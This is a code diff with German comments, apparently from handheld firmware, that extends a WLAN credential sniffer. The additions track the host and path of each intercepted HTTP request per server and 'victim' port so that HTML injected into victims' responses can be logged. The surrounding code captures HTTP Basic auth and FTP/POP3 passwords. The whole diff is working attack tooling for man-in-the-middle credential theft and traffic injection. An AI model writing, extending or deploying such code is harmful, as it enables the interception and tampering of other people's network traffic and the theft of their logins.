@@ -33,6 +33,11 @@
 #define CRED_PENDING_SLOTS 8 // USER→PASS / AUTH-LOGIN-Korrelation pro (ip,port)
 #define CRED_PENDING_TTL_MS 60000
 
+// URL-Tracking-Map (für Inject-URL-Lookup): pro (server_ip, victim_port) den
+// letzten gesehenen Host+Path aus dem HTTP-Request behalten. Wird vom
+// parse_http für JEDEN HTTP-Request (auch GET) beschrieben.
+#define HTTP_URL_TRACK_SLOTS 16
+
 // Zustände eines pending-Eintrags:
 #define PEND_FREE 0
 #define PEND_HAVE_USER 1 // FTP/POP3: USER gesehen, warte auf PASS-Zeile
@@ -47,6 +52,14 @@ typedef struct {
     char user[WLAN_CRED_STR_MAX];
 } CredPending;
 
+typedef struct {
+    uint32_t server_ip;
+    uint16_t victim_port;
+    uint32_t tick; // 0 = Slot leer
+    char host[WLAN_CRED_STR_MAX];
+    char path[WLAN_CRED_STR_MAX];
+} HttpUrlSlot;
+
 struct WlanCredSniff {
     WlanCredEntry ring[WLAN_CRED_RING_SIZE];
     volatile uint32_t write_seq; // Producer-only Zähler; Slot = (write_seq-1) % SIZE
@@ -57,6 +70,7 @@ struct WlanCredSniff {
     // Producer-private:
     uint8_t dns_seen[DNS_DEDUP_BITS / 8];
     CredPending pending[CRED_PENDING_SLOTS];
+    HttpUrlSlot url_track[HTTP_URL_TRACK_SLOTS];
 };
 
 // ===========================================================================
@@ -383,6 +397,63 @@ static void pending_clear(WlanCredSniff* cs, uint32_t ip, uint16_t port) {
 }
 
 // ===========================================================================
+// URL-Tracking-Map (nur Producer-Thread)
+// ===========================================================================
+
+static void url_track_record(
+    WlanCredSniff* cs,
+    uint32_t server_ip,
+    uint16_t victim_port,
+    const char* host,
+    const char* path) {
+    uint32_t now = furi_get_tick();
+    if(now == 0) now = 1; // 0 ist reserviert für "Slot leer"
+    int slot = -1, oldest_i = 0;
+    uint32_t oldest = 0xffffffffu;
+    for(int i = 0; i < HTTP_URL_TRACK_SLOTS; i++) {
+        if(cs->url_track[i].tick != 0 && cs->url_track[i].server_ip == server_ip &&
+           cs->url_track[i].victim_port == victim_port) {
+            slot = i;
+            break;
+        }
+        if(cs->url_track[i].tick == 0) {
+            slot = i;
+            break;
+        }
+        if(cs->url_track[i].tick <= oldest) {
+            oldest = cs->url_track[i].tick;
+            oldest_i = i;
+        }
+    }
+    if(slot < 0) slot = oldest_i;
+    cs->url_track[slot].server_ip = server_ip;
+    cs->url_track[slot].victim_port = victim_port;
+    cs->url_track[slot].tick = now;
+    copy_cstr(cs->url_track[slot].host, sizeof(cs->url_track[slot].host), host ? host : "");
+    copy_cstr(cs->url_track[slot].path, sizeof(cs->url_track[slot].path), path ? path : "");
+}
+
+static bool url_track_lookup(
+    WlanCredSniff* cs,
+    uint32_t server_ip,
+    uint16_t victim_port,
+    char* host_out,
+    int host_sz,
+    char* path_out,
+    int path_sz) {
+    for(int i = 0; i < HTTP_URL_TRACK_SLOTS; i++) {
+        if(cs->url_track[i].tick == 0) continue;
+        if(cs->url_track[i].server_ip == server_ip &&
+           cs->url_track[i].victim_port == victim_port) {
+            copy_cstr(host_out, host_sz, cs->url_track[i].host);
+            copy_cstr(path_out, path_sz, cs->url_track[i].path);
+            return true;
+        }
+    }
+    return false;
+}
+
+// ===========================================================================
 // DNS-Dedup
 // ===========================================================================
 
@@ -437,7 +508,8 @@ static void parse_dns(
 }
 
 static void parse_http(
-    WlanCredSniff* cs, uint32_t sip, uint32_t dip, uint16_t dport, const uint8_t* d, int len) {
+    WlanCredSniff* cs, uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport,
+    const uint8_t* d, int len) {
     static const char* const methods[] = {
         "GET ", "POST ", "PUT ", "HEAD ", "OPTIONS ", "DELETE ", "PATCH "};
     int m_i = -1;
@@ -475,6 +547,12 @@ static void parse_http(
         if(find_header(d, len, "host", &hv, &hvl)) copy_str(host, sizeof(host), hv, hvl);
     }
     const char* host_disp = host[0] ? host : (path[0] ? path : "?");
+
+    // URL-Map für späteren Inject-Lookup pflegen. Key = (server_ip,
+    // victim_port). Aus Sicht des Outbound-Requests: dip = Server, sport =
+    // Victim-Port. Beim inbound Response (im wlan_html_inject) sieht es
+    // gespiegelt aus: src_ip = Server, dport = Victim-Port → matcht.
+    url_track_record(cs, dip, sport, host, path);
 
     // Authorization: Basic <b64(user:pass)>
     {
@@ -812,7 +890,7 @@ void wlan_cred_sniff_feed_eth(WlanCredSniff* cs, const uint8_t* eth, uint16_t le
 
     // Nur Client→Server-Richtung dissektieren (dport == well-known).
     if(dport == 80 || dport == 8080 || dport == 8000) {
-        parse_http(cs, src_ip, dst_ip, dport, data, data_len);
+        parse_http(cs, src_ip, sport, dst_ip, dport, data, data_len);
     } else if(dport == 21) {
         parse_user_pass(cs, "FTP", src_ip, sport, dst_ip, dport, data, data_len);
     } else if(dport == 110) {
@@ -898,8 +976,23 @@ void wlan_cred_sniff_set_armed(WlanCredSniff* cs, bool armed) {
     if(armed) {
         memset(cs->dns_seen, 0, sizeof(cs->dns_seen));
         memset(cs->pending, 0, sizeof(cs->pending));
+        memset(cs->url_track, 0, sizeof(cs->url_track));
     }
     __atomic_store_n(&cs->armed, armed, __ATOMIC_RELEASE);
+}
+
+void wlan_cred_sniff_push_inject(
+    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port) {
+    if(!cs) return;
+    char host[WLAN_CRED_STR_MAX] = {0};
+    char path[WLAN_CRED_STR_MAX] = {0};
+    if(!url_track_lookup(cs, server_ip, victim_port, host, sizeof(host), path, sizeof(path))) {
+        // Kein Lookup-Treffer — Fallback: Server-IP als Host.
+        const uint8_t* b = (const uint8_t*)&server_ip;
+        snprintf(host, sizeof(host), "%u.%u.%u.%u", b[0], b[1], b[2], b[3]);
+        path[0] = 0;
+    }
+    cred_push(cs, "INJ", victim_ip, server_ip, 80, host, path, "", NULL);
 }
 
 bool wlan_cred_sniff_armed(WlanCredSniff* cs) {
